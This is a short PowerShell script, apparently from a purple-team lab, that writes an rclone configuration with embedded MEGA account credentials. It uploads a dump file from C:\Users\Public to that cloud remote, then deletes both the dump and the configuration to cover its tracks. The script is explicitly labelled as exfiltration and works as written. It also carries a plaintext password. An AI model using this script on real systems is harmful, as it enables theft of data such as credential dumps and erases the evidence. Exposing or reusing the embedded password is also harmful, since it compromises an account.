$ErrorActionPreference = 'Stop'

# === RCLONE CONFIGURATION FOR MEGA ===
New-Item "$env:APPDATA\rclone" -ItemType Directory -Force | Out-Null
Set-Content "$env:APPDATA\rclone\rclone.conf" @"
[myMegaRemote]
type = mega
user = purple.lab.local@gmail.com
pass = Tf1CRTj6UL4Y449izAhIemgWwFEAdPW9SGXcVf_l
"@

# === CHECK MEGA REMOTE AVAILABILITY ===
$remoteOK = $false
try {
    Write-Output "Checking MEGA remote connection: myMegaRemote:test"
    .\rclone.exe --config "$env:APPDATA\rclone\rclone.conf" ls myMegaRemote:test | Out-Null
    $remoteOK = $true
    Write-Output "Remote is reachable."
} catch {
    Write-Output "Error: Unable to reach MEGA remote. Exfiltration aborted."
}

# === FILE EXFILTRATION IF REMOTE IS VALID ===
$dump = "C:\Users\Public\rustive.dmp"
if ($remoteOK -and (Test-Path $dump)) {
    Write-Output "Dump file found: $dump. Starting exfiltration."
    .\rclone.exe --config "$env:APPDATA\rclone\rclone.conf" copy $dump myMegaRemote:test -v
    Remove-Item $dump -Force
    Write-Output "File successfully exfiltrated and deleted."
} elseif (-not (Test-Path $dump)) {
    Write-Output "Dump file not found: $dump"
}

# === CLEANUP ===
Remove-Item "$env:APPDATA\rclone\rclone.conf" -Force
Write-Output "Cleanup complete. Rclone configuration removed."
